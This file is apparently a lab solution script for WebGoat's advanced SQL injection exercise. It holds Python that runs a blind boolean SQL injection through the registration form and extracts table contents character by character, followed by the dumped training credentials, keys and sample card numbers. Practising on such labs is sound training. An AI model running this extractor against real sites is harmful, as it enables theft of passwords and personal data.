import requests
from tqdm import tqdm

ip = "192.168.1.95"
url = f"http://{ip}:8888/WebGoat/SqlInjectionAdvanced/register"
cookies = {
    "JSESSIONID": "90F95A800366352F2648DA49D28D9B0C"
}

# 공통 페이로드 전송 함수
def send_payload(payload):
    data = {
        "username_reg": payload,
        "email_reg": "a@a.com",
        "password_reg": "a",
        "confirm_password_reg": "a"
    }
    res = requests.put(url, data=data, cookies=cookies)
    # print(res.text)
    # print("--------------------------------------------------------------------")
    return "already exists" in res.text.lower()

# 테이블 값 추출 함수
def get_table_row_count(table):
    for i in tqdm(range(0, 100), desc=f"[{table}] 행 개수 추측 중"):
        payload = f"' OR (SELECT COUNT(*) FROM {table}) > {i} -- "
        if not send_payload(payload):
            print(f"[✓] {table} 행 개수: {i}")
            return i
    return 0

def get_value_length(table, column, row):
    for length in range(1, 100):
        payload = f"' OR LENGTH((SELECT {column} FROM {table} LIMIT {row},1)) > {length} -- "
        if not send_payload(payload):
            return length
    return 0

def get_value(table, column, row, length):
    value = ""
    for i in tqdm(range(1, length + 1), desc=f"[{table}.{column}] #{row} 값 추출 중"):
        low, high = 32, 126
        while low < high:
            mid = (low + high) // 2
            payload = f"' OR ASCII(SUBSTRING((SELECT {column} FROM {table} LIMIT {row},1), {i}, 1)) > {mid} -- "
            if send_payload(payload):
                low = mid + 1
            else:
                high = mid
        value += chr(low)
    return value

# 테이블 및 컬럼 정의
table_columns = {
    "flyway_schema_history": ["installed_rank", "version", "description", "type", "script", "checksum", "installed_by", "installed_on", "execution_time", "success"],
    "CHALLENGE_USERS": ["USERID", "EMAIL", "PASSWORD"],
    "JWT_KEYS": ["ID", "KEY"],
    "SERVERS": ["ID", "HOSTNAME", "IP", "MAC", "STATUS", "DESCRIPTION"],
    "USER_DATA": ["USERID", "FIRST_NAME", "LAST_NAME", "CC_NUMBER", "CC_TYPE", "COOKIE", "LOGIN_COUNT"],
    "SALARIES": ["USERID", "SALARY"],
    "USER_DATA_TAN": ["USERID", "FIRST_NAME", "LAST_NAME", "CC_NUMBER", "CC_TYPE", "COOKIE", "LOGIN_COUNT", "PASSWORD"],
    "SQL_CHALLENGE_USERS": ["USERID", "EMAIL", "PASSWORD"],
    "USER_SYSTEM_DATA": ["USERID", "USER_NAME", "PASSWORD", "COOKIE"],
    "EMPLOYEES": ["USERID", "FIRST_NAME", "LAST_NAME", "DEPARTMENT", "SALARY", "AUTH_TAN"],
    "ACCESS_LOG": ["ID", "TIME", "ACTION"],
    "GRANT_RIGHTS": ["USERID", "FIRST_NAME", "LAST_NAME", "DEPARTMENT", "SALARY"],
    "ACCESS_CONTROL_USERS": ["USERNAME", "PASSWORD", "ADMIN"]
}
all_values = {}

# 테이블 값 추출
all_values = {}
for table, columns in table_columns.items():
    print(f"\n[+] 테이블: {table}")
    table_data = []
    row_count = get_table_row_count(table)
    for row in range(row_count):
        row_data = {}
        print(f"  [Row #{row}]")
        for col in columns:
            length = get_value_length(table, col, row)
            if length > 0:
                val = get_value(table, col, row, length)
                print(f"    {col}: {val}")
                row_data[col] = val
        table_data.append(row_data)
    all_values[table] = table_data

# 최종 결과 출력
for table, rows in all_values.items():
    print(f"\n[=] {table} 결과:")
    for idx, row in enumerate(rows):
        print(f"  Row #{idx}:")
        for col, val in row.items():
            print(f"    {col}: {val}")
'''
[=] flyway_schema_history 결과:

[=] CHALLENGE_USERS 결과:
  Row #0:
    USERID: larry
    EMAIL: larry@webgoat.org
    PASSWORD: larryknows
  Row #1:
    USERID: tom
    EMAIL: tom@webgoat.org
    PASSWORD: thisisasecretfortomonly
  Row #2:
    USERID: alice
    EMAIL: alice@webgoat.org
    PASSWORD: rt*(KJ()LP())$#**
  Row #3:
    USERID: eve
    EMAIL: eve@webgoat.org
    PASSWORD: **********

[=] JWT_KEYS 결과:
  Row #0:
    ID: webgoat_key
    KEY: qwertyqwerty1234
  Row #1:
    ID: webwolf_key
    KEY: doesnotreallymatter

[=] SERVERS 결과:
  Row #0:
    ID: 1
    HOSTNAME: webgoat-dev
    IP: 192.168.4.0
    MAC: AA:BB:11:22:CC:DD
    STATUS: online
    DESCRIPTION: Development server
  Row #1:
    ID: 2
    HOSTNAME: webgoat-tst
    IP: 192.168.2.1
    MAC: EE:FF:33:44:AB:CD
    STATUS: online
    DESCRIPTION: Test server
  Row #2:
    ID: 3
    HOSTNAME: webgoat-acc
    IP: 192.168.3.3
    MAC: EF:12:FE:34:AA:CC
    STATUS: offline
    DESCRIPTION: Acceptance server
  Row #3:
    ID: 4
    HOSTNAME: webgoat-pre-prod
    IP: 192.168.6.4
    MAC: EF:12:FE:34:AA:CC
    STATUS: offline
    DESCRIPTION: Pre-production server
  Row #4:
    ID: 5
    HOSTNAME: webgoat-prd
    IP: 104.130.219.202
    MAC: FA:91:EB:82:DC:73
    STATUS: out of order
    DESCRIPTION: Production server

[=] USER_DATA 결과:
  Row #0:
    USERID:  
    FIRST_NAME: Joe
    LAST_NAME: Snow
    CC_NUMBER: 987654321
    CC_TYPE: VISA
    COOKIE:  
    LOGIN_COUNT:  
  Row #1:
    USERID:  
    FIRST_NAME: Joe
    LAST_NAME: Snow
    CC_NUMBER: 2234200065411
    CC_TYPE: MC
    COOKIE:  
    LOGIN_COUNT:  
  Row #2:
    USERID:  
    FIRST_NAME: John
    LAST_NAME: Smith
    CC_NUMBER: 2435600002222
    CC_TYPE: MC
    COOKIE:  
    LOGIN_COUNT:  
  Row #3:
    USERID:  
    FIRST_NAME: John
    LAST_NAME: Smith
    CC_NUMBER: 4352209902222
    CC_TYPE: AMEX
    COOKIE:  
    LOGIN_COUNT:  
  Row #4:
    USERID:  
    FIRST_NAME: Jane
    LAST_NAME: Plane
    CC_NUMBER: 123456789
    CC_TYPE: MC
    COOKIE:  
    LOGIN_COUNT:  
  Row #5:
    USERID:  
    FIRST_NAME: Jane
    LAST_NAME: Plane
    CC_NUMBER: 333498703333
    CC_TYPE: AMEX
    COOKIE:  
    LOGIN_COUNT:  
  Row #6:
    USERID:  
    FIRST_NAME: Jolly
    LAST_NAME: Hershey
    CC_NUMBER: 176896789
    CC_TYPE: MC
    COOKIE:  
    LOGIN_COUNT:  
  Row #7:
    USERID:  
    FIRST_NAME: Jolly
    LAST_NAME: Hershey
    CC_NUMBER: 333300003333
    CC_TYPE: AMEX
    COOKIE:  
    LOGIN_COUNT:  
  Row #8:
    USERID:  
    FIRST_NAME: Grumpy
    LAST_NAME: youaretheweakestlink
    CC_NUMBER: 673834489
    CC_TYPE: MC
    COOKIE:  
    LOGIN_COUNT:  
  Row #9:
    USERID:  
    FIRST_NAME: Grumpy
    LAST_NAME: youaretheweakestlink
    CC_NUMBER: 33413003333
    CC_TYPE: AMEX
    COOKIE:  
    LOGIN_COUNT:  
  Row #10:
    USERID:  
    FIRST_NAME: Peter
    LAST_NAME: Sand
    CC_NUMBER: 123609789
    CC_TYPE: MC
    COOKIE:  
    LOGIN_COUNT:  
  Row #11:
    USERID:  
    FIRST_NAME: Peter
    LAST_NAME: Sand
    CC_NUMBER: 338893453333
    CC_TYPE: AMEX
    COOKIE:  
    LOGIN_COUNT:  
  Row #12:
    USERID:  
    FIRST_NAME: Joesph
    LAST_NAME: Something
    CC_NUMBER: 33843453533
    CC_TYPE: AMEX
    COOKIE:  
    LOGIN_COUNT:  
  Row #13:
    USERID:  
    FIRST_NAME: Chaos
    LAST_NAME: Monkey
    CC_NUMBER: 32849386533
    CC_TYPE: CM
    COOKIE:  
    LOGIN_COUNT:  
  Row #14:
    USERID:  
    FIRST_NAME: Mr
    LAST_NAME: Goat
    CC_NUMBER: 33812953533
    CC_TYPE: VISA
    COOKIE:  
    LOGIN_COUNT:  

[=] SALARIES 결과:
  Row #0:
    USERID: jsmith
    SALARY:  
  Row #1:
    USERID: lsmith
    SALARY:  
  Row #2:
    USERID: wgoat
    SALARY:  
  Row #3:
    USERID: rjones
    SALARY:  
  Row #4:
    USERID: manderson
    SALARY:  

[=] USER_DATA_TAN 결과:
  Row #0:
    USERID:  
    FIRST_NAME: Joe
    LAST_NAME: Snow
    CC_NUMBER: 987654321
    CC_TYPE: VISA
    COOKIE:  
    LOGIN_COUNT:  
    PASSWORD: banana
  Row #1:
    USERID:  
    FIRST_NAME: Jane
    LAST_NAME: Plane
    CC_NUMBER: 74589864
    CC_TYPE: MC
    COOKIE:  
    LOGIN_COUNT:  
    PASSWORD: tarzan
  Row #2:
    USERID:  
    FIRST_NAME: Jack
    LAST_NAME: Sparrow
    CC_NUMBER: 68659365
    CC_TYPE: MC
    COOKIE:  
    LOGIN_COUNT:  
    PASSWORD: sniffy

[=] SQL_CHALLENGE_USERS 결과:

[=] USER_SYSTEM_DATA 결과:
  Row #0:
    USERID:  
    USER_NAME: jsnow
    PASSWORD: passwd1
    COOKIE:  
  Row #1:
    USERID:  
    USER_NAME: jdoe
    PASSWORD: passwd2
    COOKIE:  
  Row #2:
    USERID:  
    USER_NAME: jplane
    PASSWORD: passwd3
    COOKIE:  
  Row #3:
    USERID:  
    USER_NAME: jeff
    PASSWORD: jeff
    COOKIE:  
  Row #4:
    USERID:  
    USER_NAME: dave
    PASSWORD: passW0rD
    COOKIE:  

[=] EMPLOYEES 결과:
  Row #0:
    USERID: 32147
    FIRST_NAME: Paulina
    LAST_NAME: Travers
    DEPARTMENT: Accounting
    SALARY:  
    AUTH_TAN: P45JSI
  Row #1:
    USERID: 34477
    FIRST_NAME: Abraham 
    LAST_NAME: Holman
    DEPARTMENT: Development
    SALARY:  
    AUTH_TAN: UU2ALK
  Row #2:
    USERID: 37648
    FIRST_NAME: John
    LAST_NAME: Smith
    DEPARTMENT: Marketing
    SALARY:  
    AUTH_TAN: 3SL99A
  Row #3:
    USERID: 89762
    FIRST_NAME: Tobi
    LAST_NAME: Barnett
    DEPARTMENT: Development
    SALARY:  
    AUTH_TAN: TA9LL1
  Row #4:
    USERID: 96134
    FIRST_NAME: Bob
    LAST_NAME: Franco
    DEPARTMENT: Marketing
    SALARY:  
    AUTH_TAN: LO9S2V

[=] ACCESS_LOG 결과:

[=] GRANT_RIGHTS 결과:
  Row #0:
    USERID: 32147
    FIRST_NAME: Paulina
    LAST_NAME: Travers
    DEPARTMENT: Accounting
    SALARY:  
  Row #1:
    USERID: 34477
    FIRST_NAME: Abraham 
    LAST_NAME: Holman
    DEPARTMENT: Development
    SALARY:  
  Row #2:
    USERID: 37648
    FIRST_NAME: John
    LAST_NAME: Smith
    DEPARTMENT: Marketing
    SALARY:  
  Row #3:
    USERID: 89762
    FIRST_NAME: Tobi
    LAST_NAME: Barnett
    DEPARTMENT: Development
    SALARY:  
  Row #4:
    USERID: 96134
    FIRST_NAME: Bob
    LAST_NAME: Franco
    DEPARTMENT: Marketing
    SALARY:  

[=] ACCESS_CONTROL_USERS 결과:
  Row #0:
    USERNAME: Tom
    PASSWORD: qwertyqwerty1234
    ADMIN:  
  Row #1:
    USERNAME: Jerry
    PASSWORD: doesnotreallymatter
    ADMIN:  
  Row #2:
    USERNAME: Sylvester
    PASSWORD: testtesttest
    ADMIN:  
'''
